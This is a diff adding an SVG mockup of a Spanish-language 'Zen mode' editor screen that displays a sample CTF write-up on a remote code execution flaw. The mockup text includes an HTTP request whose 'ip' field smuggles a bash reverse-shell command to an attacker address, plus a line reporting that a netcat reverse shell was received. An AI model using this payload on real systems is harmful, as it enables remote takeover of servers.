@@ -1,0 +1,70 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 675" width="1200" height="675" fill="none">
+  <defs>
+    <linearGradient id="zenBg" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#090d16" />
+      <stop offset="100%" stop-color="#111827" />
+    </linearGradient>
+    <filter id="zenShadow" x="-5%" y="-5%" width="110%" height="110%">
+      <feDropShadow dx="0" dy="16" stdDeviation="30" flood-color="#000000" flood-opacity="0.6" />
+    </filter>
+  </defs>
+
+  <!-- Canvas Background -->
+  <rect width="1200" height="675" fill="url(#zenBg)" />
+
+  <!-- Zen Window Mockup -->
+  <g transform="translate(60, 45)" filter="url(#zenShadow)">
+    <rect width="1080" height="585" rx="16" fill="#0f172a" stroke="#334155" stroke-width="1" />
+
+    <!-- Minimal Floating Zen Bar (Top) -->
+    <g transform="translate(20, 16)">
+      <!-- Zen Badge -->
+      <rect width="105" height="28" rx="14" fill="#312e81" stroke="#6366f1" stroke-width="1" />
+      <text x="52" y="18" text-anchor="middle" font-family="sans-serif" font-size="11" font-weight="700" fill="#c7d2fe">🧘 Modo Zen</text>
+
+      <!-- Center Title -->
+      <text x="520" y="19" text-anchor="middle" font-family="sans-serif" font-size="12" font-weight="600" fill="#94a3b8">
+        Writeup CTF — Enfoque Total Sin Distracciones
+      </text>
+
+      <!-- Exit Button -->
+      <rect x="940" y="0" width="100" height="28" rx="6" fill="#1e293b" stroke="#475569" stroke-width="1" />
+      <text x="990" y="18" text-anchor="middle" font-family="sans-serif" font-size="11" font-weight="600" fill="#e2e8f0">Salir (Esc)</text>
+    </g>
+
+    <line x1="0" y1="56" x2="1080" y2="56" stroke="#1e293b" stroke-width="1" />
+
+    <!-- Centered Typography & Generous Margins -->
+    <g transform="translate(260, 95)" font-family="'JetBrains Mono', 'Fira Code', Menlo, monospace">
+      <!-- Title -->
+      <text x="0" y="30" font-family="sans-serif" font-size="28" font-weight="800" fill="#f8fafc">
+        Análisis de Vulnerabilidad RCE
+      </text>
+      <text x="0" y="60" font-family="sans-serif" font-size="14" fill="#64748b">
+        Margen expandido • Tipografía centrada • Productividad sin ruido visual
+      </text>
+
+      <line x1="0" y1="85" x2="560" y2="85" stroke="#334155" stroke-width="1" />
+
+      <!-- Text Body -->
+      <text x="0" y="125" font-size="14" fill="#cbd5e1" font-weight="400">
+        Durante la fase de reconocimiento descubrimos un endpoint
+      </text>
+      <text x="0" y="150" font-size="14" fill="#cbd5e1">
+        vulnerable a inyección de comandos en `/api/v1/ping`.
+      </text>
+
+      <!-- Code Block -->
+      <rect x="0" y="175" width="560" height="110" rx="8" fill="#020617" stroke="#1e293b" stroke-width="1" />
+      <text x="20" y="208" font-size="13" fill="#38bdf8">POST /api/v1/ping HTTP/1.1</text>
+      <text x="20" y="232" font-size="13" fill="#94a3b8">Host: target.local</text>
+      <text x="20" y="256" font-size="13" fill="#f43f5e">{"ip": "127.0.0.1; bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1"}</text>
+
+      <!-- State Note -->
+      <rect x="0" y="310" width="560" height="42" rx="8" fill="#064e3b" stroke="#059669" stroke-width="1" />
+      <text x="20" y="336" font-family="sans-serif" font-size="13" font-weight="700" fill="#a7f3d0">
+        [+] Conexión inversa recibida en el listener Netcat (Reverse Shell estable)
+      </text>
+    </g>
+  </g>
+</svg>
